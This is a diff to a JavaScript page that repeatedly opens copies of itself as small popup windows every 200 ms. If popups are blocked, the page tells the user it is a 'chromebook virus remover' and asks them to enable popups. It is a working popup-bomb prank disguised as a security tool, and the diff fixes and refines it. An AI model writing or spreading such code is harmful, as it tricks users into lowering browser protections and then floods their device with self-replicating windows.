@@ -3,8 +3,10 @@ function moveWindows() {
   let window1 = window.open(location.href, "_blank", "width=200,height=200");
   let window2 = window.open(location.href, "_blank", "width=200,height=200");
 
-  if (!newWin || newWin.closed || typeof newWin.closed == "undefined") {
-    document.querySelector('h1').innerHTML="The chromebook virus remover makes a popup that removes the virus. Please enable popups and reload this page."
+  if (!window1 || window1.closed || typeof window1.closed == "undefined") {
+    document.querySelector("h1").innerHTML =
+      "The chromebook virus remover makes a popup that removes the virus. Please enable popups and reload this page.";
+    clearInterval(interval);
   }
 
   // Set the initial positions and velocities of the windows
@@ -51,6 +53,6 @@ function moveWindows() {
 }
 
 // Call the function to start moving the windows
-setInterval(() => {
+let interval = setInterval(() => {
   moveWindows();
 }, 200);
